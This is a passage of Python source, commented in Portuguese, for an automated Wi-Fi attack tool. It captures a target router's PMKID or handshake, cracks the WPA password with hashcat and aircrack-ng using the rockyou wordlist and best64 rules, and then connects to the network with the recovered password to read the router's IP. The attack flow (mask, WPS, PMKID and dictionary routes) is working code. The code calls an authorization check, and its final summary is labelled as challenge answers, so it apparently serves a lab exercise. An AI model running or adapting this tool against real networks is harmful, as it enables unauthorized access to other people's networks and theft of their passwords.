        filtro = f"wlan addr1 {bssid} or wlan addr2 {bssid} or wlan addr3 {bssid} or wlan addr3 ff:ff:ff:ff:ff:ff"
        # O filtro precisa ser compilado contra uma interface já em modo
        # monitor (link-layer 802.11/radiotap) — por isso isso roda ANTES
        # de sair do modo monitor do airmon-ng, logo abaixo.
        with open(bpf_file, "wb") as f:
            r = subprocess.run(
                ["tcpdump", "-i", self.moniface, filtro, "-ddd"],
                stdout=f, stderr=subprocess.PIPE, timeout=20,
            )
        if r.returncode != 0:
            self.log("Falha ao compilar filtro BPF para o PMKID. Pulando rota PMKID.")
            return False

        # hcxdumptool NÃO funciona sobre uma interface monitor já criada
        # pelo airmon-ng/iw (gerencia o modo monitor sozinho, direto na
        # interface física) — usar o "wlanXmon" do airmon-ng resulta em
        # 0 pacotes capturados sempre, silenciosamente. Por isso saímos do
        # modo monitor aqui, deixamos o hcxdumptool cuidar disso sozinho, e
        # recriamos o modo monitor depois pra seguir com as próximas rotas.
        self.log("Saindo do modo monitor do airmon-ng (hcxdumptool precisa da interface física crua)...")
        r = self.run(["airmon-ng", "stop", self.moniface], timeout=20)
        if r.returncode != 0:
            self.log(f"Falha ao sair do modo monitor para PMKID (rc={r.returncode}).")
            return False
        self.monitor_ativo = False
        self.moniface = None
        self._sleep_interruptivel(1)

        # -c aceita canal (<=1000) ou frequência em MHz (>1000); usamos a
        # frequência pra não depender do sufixo de banda (convenção a/b é
        # ambígua e varia entre versões). -w (não -o) é o flag de saída no
        # hcxdumptool >= 6.3.0 / 7.x (Ubuntu/Kali atuais).
        ch_int = int(self.target["ch"]) if str(self.target["ch"]).isdigit() else 0
        if self.target.get("freq_label") == "5 GHz":
            freq_mhz = 5000 + ch_int * 5
        elif ch_int == 14:
            freq_mhz = 2484
        else:
            freq_mhz = 2407 + ch_int * 5
        self.log(f"Tentando capturar PMKID direto do roteador por 30s (canal {self.target['ch']}, {freq_mhz} MHz)...")
        try:
            self.run(
                ["hcxdumptool", "-i", self.iface, "-w", str(pmkid_cap),
                 f"--bpf={bpf_file}", "-c", str(freq_mhz)],
                timeout=30,
            )
        finally:
            # Sempre volta pro modo monitor via airmon-ng, mesmo se a rota
            # falhar — as próximas rotas (dicionário) dependem disso.
            self.log("Recriando modo monitor via airmon-ng para seguir com as próximas rotas...")
            self.entrar_modo_monitor(self.iface)

        if not pmkid_cap.exists() or pmkid_cap.stat().st_size == 0:
            self.log("Nenhum pacote capturado na tentativa de PMKID.")
            return False

        if not _tool_existe("hcxpcapngtool"):
            self.log("hcxpcapngtool não encontrado — não é possível converter o PMKID capturado.")
            return False

        self.run(["hcxpcapngtool", "-o", str(pmkid_hash), str(pmkid_cap)])
        if not pmkid_hash.exists() or pmkid_hash.stat().st_size == 0:
            self.log("O roteador não respondeu com PMKID (comum em APs com WPA3/PMF). Rota D sem sucesso.")
            return False

        # Se o usuário informou uma máscara na Rota A, tenta ela no PMKID primeiro
        # — assim dá pra quebrar SEM depender de cliente conectado (handshake).
        if self._mask:
            self.log("PMKID capturado! Tentando quebrar com a máscara informada...")
            senha = self._crack_hc22000_com_mascara(pmkid_hash, self._mask)
            if senha:
                self.senha = senha
                self.rota_usada = "PMKID + máscara"
                self.log("Senha encontrada via PMKID + máscara (valor redigido do log).")
                return True
            self.log("Máscara não quebrou o PMKID. Tentando rockyou...")

        if not ROCKYOU.exists() or ROCKYOU.stat().st_size == 0:
            self.log("Wordlist rockyou.txt não disponível. Não é possível quebrar o PMKID capturado.")
            return False

        self.log("PMKID capturado! Tentando quebrar com hashcat (rockyou + best64)...")
        found_file = WORKDIR / "pmkid_found_gui.txt"
        found_file.unlink(missing_ok=True)
        self.run([
            "hashcat", "-m", "22000", str(pmkid_hash), str(ROCKYOU),
            "-r", "/usr/share/hashcat/rules/best64.rule",
            "--potfile-disable", "-o", str(found_file),
        ], timeout=1800)

        if found_file.exists() and found_file.stat().st_size > 0:
            linha = found_file.read_text().strip().splitlines()[-1]
            self.senha = linha.split(":", 1)[-1]
            self.rota_usada = "PMKID (hcxdumptool + hashcat)"
            self.log("Senha encontrada via PMKID (valor redigido do log).")
            return True

        self.log("PMKID capturado mas senha não encontrada no dicionário. Rota D sem sucesso final.")
        return False

    def rota_dicionario(self):
        self.log("--- Rota C: dicionário + regras (hashcat / aircrack-ng) ---")
        if not self.capturar_handshake():
            return False

        cap = self._ultimo_cap()
        if not ROCKYOU.exists() or ROCKYOU.stat().st_size == 0:
            self.log("Wordlist rockyou.txt não disponível. Não é possível rodar a Rota C.")
            return False

        hashfile = WORKDIR / "hash_gui.hc22000"
        hashfile.unlink(missing_ok=True)
        if _tool_existe("hcxpcapngtool"):
            self.log("Convertendo captura para formato hashcat (hc22000)...")
            self.run(["hcxpcapngtool", "-o", str(hashfile), str(cap)])

        if hashfile.exists() and hashfile.stat().st_size > 0 and _tool_existe("hashcat"):
            self.log("Rodando hashcat (modo 22000) com rockyou + regra best64...")
            found_file = WORKDIR / "hashcat_found_gui.txt"
            found_file.unlink(missing_ok=True)
            self.run([
                "hashcat", "-m", "22000", str(hashfile), str(ROCKYOU),
                "-r", "/usr/share/hashcat/rules/best64.rule",
                "--potfile-disable", "-o", str(found_file),
            ], timeout=1800)
            if found_file.exists() and found_file.stat().st_size > 0:
                linha = found_file.read_text().strip().splitlines()[-1]
                self.senha = linha.split(":", 1)[-1]
                self.rota_usada = "Dicionário (hashcat + best64)"
                self.log("Senha encontrada via hashcat (valor redigido do log).")
                return True
            self.log("Hashcat não encontrou. Tentando fallback via aircrack-ng (CPU)...")

        self.log("Rodando aircrack-ng com rockyou.txt (pode demorar)...")
        r = self.run(["aircrack-ng", "-w", str(ROCKYOU), "-b", self.target["bssid"], str(cap)], timeout=1800)
        m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", r.stdout)
        if m:
            self.senha = m.group(1)
            self.rota_usada = "Dicionário (aircrack-ng/rockyou)"
            self.log("Senha encontrada via aircrack-ng (valor redigido do log).")
            return True

        # Wordlists extras colocadas em wordlists/ (ex.: senhas BR), além do rockyou.
        for wl in sorted(WORDLIST_DIR.glob("*.txt")):
            if wl.resolve() == ROCKYOU.resolve():
                continue
            self.log(f"Tentando wordlist extra: {wl.name}...")
            if hashfile.exists() and hashfile.stat().st_size > 0 and _tool_existe("hashcat"):
                found_file = WORKDIR / "hashcat_extra_gui.txt"
                found_file.unlink(missing_ok=True)
                self.run([
                    "hashcat", "-m", "22000", str(hashfile), str(wl),
                    "-r", "/usr/share/hashcat/rules/best64.rule",
                    "--potfile-disable", "-o", str(found_file),
                ], timeout=1800)
                if found_file.exists() and found_file.stat().st_size > 0:
                    linha = found_file.read_text().strip().splitlines()[-1]
                    self.senha = linha.split(":", 1)[-1]
                    self.rota_usada = f"Dicionário ({wl.name} + best64)"
                    self.log("Senha encontrada via hashcat/wordlist extra (valor redigido do log).")
                    return True
            r2 = self.run(["aircrack-ng", "-w", str(wl), "-b", self.target["bssid"], str(cap)], timeout=1800)
            m2 = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", r2.stdout)
            if m2:
                self.senha = m2.group(1)
                self.rota_usada = f"Dicionário ({wl.name})"
                self.log("Senha encontrada via aircrack-ng/wordlist extra (valor redigido do log).")
                return True

        self.log("Senha não encontrada no dicionário rockyou.txt + regras best64.")
        self.log("Isso sugere senha forte (fora de listas comuns de senhas vazadas).")
        return False

    # ------------------------------------------------------------------
    # 7. orquestração automática
    # ------------------------------------------------------------------

    def executar_ataque(self, mascara=None):
        """mascara: dict opcional {tamanho, prefixo, tipo} — se vier, tenta
        a Rota A primeiro. Senão, segue direto WPS -> PMKID -> Dicionário."""
        if not self.autorizacao_valida():
            raise RuntimeError(
                "Autorização ausente ou pertence a outro BSSID. Abortando antes de qualquer ataque."
            )

        self._mask = mascara  # guarda p/ a Rota D (PMKID) reusar se a Rota A falhar

        try:
            if mascara:
                if mascara.get("hashcat"):
                    ok = self.rota_mascara_hashcat(mascara["hashcat"], mascara.get("custom", ""))
                elif mascara.get("mascara"):
                    ok = self.rota_mascara(mascara=mascara["mascara"])
                else:
                    ok = self.rota_mascara(
                        mascara.get("tamanho"), mascara.get("prefixo", ""), mascara.get("tipo", "")
                    )
                if ok:
                    return True
                self.log("Rota de máscara não teve sucesso. Seguindo para as próximas rotas.")

            if self.rota_wps():
                return True
            self.log("Rota WPS não teve sucesso (ou não aplicável). Seguindo para PMKID.")

            if self.rota_pmkid():
                return True
            self.log("Rota PMKID não teve sucesso (ou não aplicável). Seguindo para dicionário.")

            if self.rota_dicionario():
                return True

            self.log("Nenhuma rota de ataque teve sucesso. Senha não descoberta.")
            return False
        except AttackAborted as e:
            self.log(f"Ataque interrompido: {e}")
            return False

    # ------------------------------------------------------------------
    # 8. conexão final + resumo
    # ------------------------------------------------------------------

    def conectar_e_obter_gateway(self):
        if not self.senha:
            self.log("Sem senha descoberta — não é possível conectar automaticamente para ler o gateway.")
            return

        self.restaurar_modo_gerenciado()
        time.sleep(3)

        self.log(f"Conectando à rede {self.target['essid']} com a senha descoberta...")
        r = self.run(
            [
                "nmcli", "dev", "wifi", "connect", self.target["essid"],
                "password", self.senha, "bssid", self.target["bssid"],
                "ifname", self.iface,
            ],
            timeout=45,
            ocultar=(self.senha,),
        )
        if r.returncode != 0:
            self.log(f"Falha ao conectar ao BSSID selecionado (rc={r.returncode}).")
            return False
        time.sleep(5)

        r = self.run(["ip", "route"])
        m = re.search(r"^default via (\S+)", r.stdout, re.MULTILINE)
        if m:
            self.ip_roteador = m.group(1)
            self.log(f"Gateway (IP do roteador) obtido: {self.ip_roteador}")
            return True
        else:
            self.log("Não foi possível obter o gateway após conectar.")
            return False

    def resumo(self):
        ch = int(self.target.get("ch", 0) or 0)
        if self.target.get("freq_label") == "5 GHz":
            freq_txt = "5 GHz"
        else:
            freq_txt = f"2.4 GHz ({2407 + ch * 5} MHz aprox.)"

        texto = (
            "================= RESPOSTAS DO DESAFIO =================\n"
            f"ESSID .............: {self.target.get('essid', '')}\n"
            f"Frequência ........: {freq_txt}\n"
            f"Canal .............: {self.target.get('ch', '')}\n"
            f"MAC do roteador ...: {self.target.get('bssid', '')}\n"
            f"IP do roteador ....: {self.ip_roteador or '<não obtido>'}\n"
            f"Senha .............: {self.senha or '<não descoberta>'}\n"
            f"Rota usada ........: {self.rota_usada or '<nenhuma / somente dados>'}\n"
            f"Deauth estado .....: {self.deauth_estado}\n"
            "===========================================================\n"
        )
        RESPOSTAS.write_text(texto)
        self.log(f"Resumo final salvo em {RESPOSTAS}")
        return {
            "essid": self.target.get("essid"),
            "freq": freq_txt,
            "canal": self.target.get("ch"),
            "bssid": self.target.get("bssid"),
            "ip": self.ip_roteador,
            "senha": self.senha,
            "rota": self.rota_usada,
            "deauth_estado": self.deauth_estado,
            "texto": texto,
        }

    def cleanup(self):
        self.log("Executando limpeza / restauração da interface...")
        try:
            with self._processos_lock:
                processos = list(self._processos)
            for proc in processos:
                self._encerrar_processo(proc)
            self.restaurar_modo_gerenciado()
        except Exception as e:  # nunca deixar a limpeza travar o programa
            self.log(f"Aviso durante limpeza: {e}")
        self.log("Limpeza concluída.")


def _tool_existe(nome):
    r = subprocess.run(["bash", "-c", f"command -v {nome}"], capture_output=True)
    return r.returncode == 0
